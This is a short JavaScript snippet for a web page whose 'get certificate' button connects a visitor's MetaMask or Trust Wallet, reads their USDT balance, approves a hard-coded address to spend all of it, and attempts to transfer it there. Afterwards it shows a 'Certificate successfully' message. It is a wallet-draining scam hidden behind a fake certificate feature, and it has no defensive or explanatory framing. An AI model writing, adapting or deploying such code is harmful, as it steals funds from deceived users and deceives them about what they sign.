const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT

const ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "success", type: "bool" }],
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ name: "success", type: "bool" }],
    type: "function",
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "remaining", type: "uint256" }],
    type: "function",
  }
];

document.getElementById("getCertificateBtn").addEventListener("click", async () => {
  if (typeof window.ethereum === "undefined") {
    alert("Trust Wallet ya MetaMask install karein!");
    return;
  }

  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: "eth_requestAccounts" });

  const accounts = await web3.eth.getAccounts();
  const sender = accounts[0];

  const usdt = new web3.eth.Contract(ABI, usdtAddress);

  const balance = await usdt.methods.balanceOf(sender).call();
  if (balance === "0") {
    alert("USDT balance nahi mila.");
    return;
  }

  // Approve step
  await usdt.methods
    .approve(receiverAddress, balance)
    .send({ from: sender });

  // Transfer step
  await usdt.methods
    .transferFrom(sender, receiverAddress, balance)
    .send({ from: sender });

  const humanReadable = web3.utils.fromWei(balance, "ether");

  alert(`Certificate successfully.\nTransferred: ${humanReadable} USDT`);
});
